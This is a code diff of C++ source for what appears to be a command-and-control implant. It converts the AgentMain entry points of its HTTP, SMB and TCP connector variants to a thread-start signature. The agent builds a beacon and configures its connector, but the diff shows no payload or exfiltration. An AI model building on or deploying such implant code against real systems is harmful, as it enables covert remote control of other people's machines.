@@ -12,10 +12,10 @@ Agent* g_Agent;
 #include "ConnectorHTTP.h"
 ConnectorHTTP* g_Connector;
 
-void AgentMain()
+DWORD WINAPI AgentMain(LPVOID lpParam)
 {
 	if ( !ApiLoad() ) 
-		return;
+		return 0;
 
 	g_Agent = new Agent();
 	g_Connector = new ConnectorHTTP();
@@ -24,7 +24,7 @@ void AgentMain()
 	BYTE* beat = g_Agent->BuildBeat(&beatSize);
 
 	if ( !g_Connector->SetConfig(g_Agent->config->profile, beat, beatSize) )
-		return;
+		return 0;
 
 	Packer* packerOut = new Packer();
 	packerOut->Pack32(0);
@@ -82,16 +82,16 @@ void AgentMain()
 #include "ConnectorSMB.h"
 ConnectorSMB* g_Connector;
 
-void AgentMain()
+DWORD WINAPI AgentMain(LPVOID lpParam)
 {
 	if (!ApiLoad())
-		return;
+		return 0;
 
 	g_Agent = new Agent();
 	g_Connector = new ConnectorSMB();
 
 	if (!g_Connector->SetConfig(g_Agent->config->profile, NULL, NULL))
-		return;
+		return 0;
 
 	ULONG beatSize = 0;
 	BYTE* beat = g_Agent->BuildBeat(&beatSize);
@@ -165,16 +165,16 @@ void AgentMain()
 #include "ConnectorTCP.h"
 ConnectorTCP* g_Connector;
 
-void AgentMain()
+DWORD WINAPI AgentMain(LPVOID lpParam)
 {
 	if (!ApiLoad())
-		return;
+		return 0;
 
 	g_Agent = new Agent();
 	g_Connector = new ConnectorTCP();
 
 	if (!g_Connector->SetConfig(g_Agent->config->profile, NULL, NULL))
-		return;
+		return 0;
 
 	ULONG beatSize = 0;
 	BYTE* beat = g_Agent->BuildBeat(&beatSize);
